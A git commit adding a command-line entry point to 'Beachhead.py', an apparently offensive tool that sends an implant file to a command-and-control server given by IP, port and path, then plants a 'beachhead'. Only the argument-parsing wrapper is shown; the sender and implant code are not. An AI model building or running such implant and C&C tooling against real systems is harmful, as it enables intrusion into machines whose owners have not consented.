8d64803d32416f8f640d1d2443692aaee9114327
Jeremy Dunn <jeremydunn@umass.edu>
2023-05-10 12:44:49 -0400

    Add argument parsing to beachhead

--- beachhead/Beachhead.py
+++ beachhead/Beachhead.py
@@ -20,3 +20,16 @@ def implant_beachhead(ip_addr, port, path):
 def implant_cnc(ip_addr, port, path, implant_file_path):
     sender = BeachheadSender(ip_addr, port, path, implant_file_path)
     sender.send_request()
+
+
+if __name__ == '__main__':
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--ip', required=True, help='IP address of the C&C server')
+    parser.add_argument('--port', required=True, help='Port of the C&C server')
+    parser.add_argument('--path', required=True, help='Path to the C&C server')
+    parser.add_argument('--implant', required=True, help='Path to the implant file')
+    args = parser.parse_args()
+
+    implant_cnc(args.ip, args.port, args.path, args.implant)
+    implant_beachhead(args.ip, args.port, args.path)
